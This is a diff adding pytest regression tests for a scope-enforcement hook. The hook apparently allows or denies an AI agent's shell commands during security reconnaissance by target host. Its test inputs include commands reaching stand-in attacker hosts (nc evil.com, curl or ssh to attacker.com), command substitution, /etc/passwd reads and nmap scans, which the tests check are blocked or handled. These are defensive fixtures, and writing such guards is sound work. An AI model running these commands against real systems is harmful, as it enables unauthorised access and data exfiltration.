@@ -202,6 +202,125 @@ def test_extract_wget() -> None:
     assert targets == ["http://example.com/"]
 
 
+# --- smoke-2026-08-19 regression: command semantics must not misfire -----------
+# Real shapes pulled from the recon workspace: grep regexes, local file paths,
+# chunk filenames, redirections, and python module paths were all mistaken for
+# target hosts and denied even though the real network target was in scope.
+def test_redirect_targets_are_not_extracted() -> None:
+    scope = Scope(in_scope=[], out_of_scope=[])
+    targets = scope.extract_targets(
+        "Bash", {"command": "curl -s https://example.com/api 2>err.log"}
+    )
+    assert targets == ["https://example.com/api"]
+    # fd-dup "2>&1" must not corrupt the subcommand split
+    targets = scope.extract_targets(
+        "Bash", {"command": "curl -s https://example.com/api 2>&1 | head -5"}
+    )
+    assert targets == ["https://example.com/api"]
+
+
+def test_local_paths_and_chunk_names_are_not_extracted() -> None:
+    scope = Scope(in_scope=[], out_of_scope=[])
+    for cmd in (
+        "cat /var/www/target/index.html",
+        "grep -c admin ./response.json",
+        "diff ../old/notes.txt new_notes.txt",
+        "cat 10ejbmr6i2_1p.js",
+        "wc -l out.html",
+    ):
+        assert scope.extract_targets("Bash", {"command": cmd}) == [], cmd
+
+
+def test_grep_regex_and_module_tokens_are_not_extracted() -> None:
+    scope = Scope(in_scope=[], out_of_scope=[])
+    for cmd in (
+        "grep -oE '/api/[a-zA-Z0-9_/.-]*' page.html",
+        "grep -oE '/api/[a-zA-Z0-9_/?=.-]+' page.html",
+        "python3 -c 'import urllib.request, json; print(1)'",
+    ):
+        assert scope.extract_targets("Bash", {"command": cmd}) == [], cmd
+
+
+def test_hook_allows_in_scope_target_with_redirection_and_local_pipeline() -> None:
+    scope = Scope(in_scope=["103.236.66.228"], out_of_scope=[])
+    cmd = (
+        "curl -s http://103.236.66.228:3333/ -o index.html 2>err.log "
+        "&& grep -oE '/api/[a-zA-Z0-9_/.-]*' index.html | sort -u"
+    )
+    decision = _hook_decision(scope, "Bash", {"command": cmd})
+    assert decision == {}
+
+
+def test_hook_url_in_local_command_still_enforced() -> None:
+    # A purely local pipeline carrying an out-of-scope URL is still denied.
+    scope = Scope(in_scope=["example.com"], out_of_scope=[])
+    decision = _hook_decision(
+        scope, "Bash", {"command": "echo see https://attacker.com/x | grep see"}
+    )
+    assert _is_deny(decision)
+
+
+def test_hook_bare_port_is_not_a_target() -> None:
+    scope = Scope(in_scope=["10.0.0.1"], out_of_scope=[])
+    decision = _hook_decision(scope, "Bash", {"command": "nc -zv 10.0.0.1 80"})
+    assert decision == {}
+
+
+def test_hook_unwraps_sudo_timeout_to_real_program() -> None:
+    scope = Scope(in_scope=["10.0.0.5"], out_of_scope=[])
+    assert _hook_decision(scope, "Bash", {"command": "sudo nmap -p 80 10.0.0.5"}) == {}
+    assert _hook_decision(scope, "Bash", {"command": "timeout 10 curl http://10.0.0.5/"}) == {}
+    # the unwrapped target itself must still be judged
+    scope_bad = Scope(in_scope=["10.0.0.5"], out_of_scope=[])
+    assert _is_deny(_hook_decision(scope_bad, "Bash", {"command": "sudo nmap -p 80 10.0.0.6"}))
+
+
+def test_hook_userinfo_host_still_judged() -> None:
+    # ssh user@host: the host part participates even with the tightened charset.
+    scope = Scope(in_scope=["example.com"], out_of_scope=[])
+    assert _hook_decision(scope, "Bash", {"command": "ssh deploy@example.com uptime"}) == {}
+    assert _is_deny(_hook_decision(scope, "Bash", {"command": "ssh deploy@attacker.com id"}))
+
+
+def test_hook_quoted_code_semicolons_do_not_split() -> None:
+    # ";" inside the quoted python payload must not fake a second subcommand
+    # whose "program" would be unrecognized and deny the call.
+    scope = Scope(in_scope=["example.com"], out_of_scope=[])
+    cmd = "python3 -c 'import urllib.request, json; print(json.dumps({\"a\": 1}))'"
+    assert _hook_decision(scope, "Bash", {"command": cmd}) == {}
+    # same for a quoted ">" inside a pattern
+    assert _hook_decision(scope, "Bash", {"command": "grep 'a > b' notes.txt"}) == {}
+
+
+def test_hook_command_substitution_stays_denied() -> None:
+    # $(...) / backticks splice in text the guard cannot see: keep denying.
+    scope = Scope(in_scope=["example.com"], out_of_scope=[])
+    for cmd in (
+        "echo $(nc evil.com 80)",
+        'curl "http://$(hostname):8080/"',
+        "echo `nmap 10.0.0.5`",
+    ):
+        assert _is_deny(_hook_decision(scope, "Bash", {"command": cmd})), cmd
+
+
+def test_hook_heredoc_body_handled_as_data() -> None:
+    scope = Scope(in_scope=["example.com"], out_of_scope=[])
+    # Quoted marker: body is verbatim stdin — JS snippets with $('sel') and
+    # template literals must not look like command substitution.
+    cmd = "python3 - <<'EOF'\nimport json\nprint(json.loads(r\"$('div'), `tpl ${x}`\"))\nEOF"
+    assert _hook_decision(scope, "Bash", {"command": cmd}) == {}
+    # Unquoted marker: the shell expands $(...) while building the body — deny.
+    cmd2 = "python3 - <<EOF\nrun($(curl -s http://attacker.com))\nEOF"
+    assert _is_deny(_hook_decision(scope, "Bash", {"command": cmd2}))
+
+
+def test_hook_heredoc_with_url_still_enforced() -> None:
+    # Whole-command URL extraction covers heredoc bodies too.
+    scope = Scope(in_scope=["example.com"], out_of_scope=[])
+    cmd = "python3 - <<'EOF'\nimport urllib.request\nprint(urllib.request.urlopen('https://attacker.com/').status)\nEOF"
+    assert _is_deny(_hook_decision(scope, "Bash", {"command": cmd}))
+
+
 # --- non-Bash extraction ------------------------------------------------------
 def test_extract_non_bash_scalar_fields() -> None:
     scope = Scope(in_scope=[], out_of_scope=[])
@@ -221,10 +340,27 @@ def test_extract_non_bash_list_field() -> None:
 
 
 # --- hook behavior ------------------------------------------------------------
-def test_hook_bash_extraction_failure_blocks() -> None:
-    # A Bash command with no recognizable target host is blocked outright.
+def test_hook_local_commands_pass_without_target() -> None:
+    # Purely local command lines (files, grep patterns, interpreters reading
+    # local data) have no network reach, so no target is required.
     scope = Scope(in_scope=["example.com"], out_of_scope=[])
-    for cmd in ("ls -la", "echo hello world", "cat /etc/passwd"):
+    for cmd in (
+        "ls -la",
+        "echo hello world",
+        "cat /etc/passwd",
+        "grep -oE '/api/[a-zA-Z0-9_/.-]*' page.html | wc -l",
+        "python3 -c 'import urllib.request, json; print(json.dumps({}))'",
+        "cat 10ejbmr6i2_1p.js",
+    ):
+        decision = _hook_decision(scope, "Bash", {"command": cmd})
+        assert decision == {}, cmd
+
+
+def test_hook_bash_extraction_failure_blocks() -> None:
+    # Default-deny is preserved where it matters: a network tool whose target
+    # is not extractable (hidden behind a variable) and unrecognized programs.
+    scope = Scope(in_scope=["example.com"], out_of_scope=[])
+    for cmd in ("curl $TARGET", "nmap $HOST -p 80", "./scan.sh 10.0.0.5", "bash -c 'echo hi'"):
         decision = _hook_decision(scope, "Bash", {"command": cmd})
         assert _is_deny(decision), cmd
         reason = decision["hookSpecificOutput"]["permissionDecisionReason"]  # type: ignore[index]
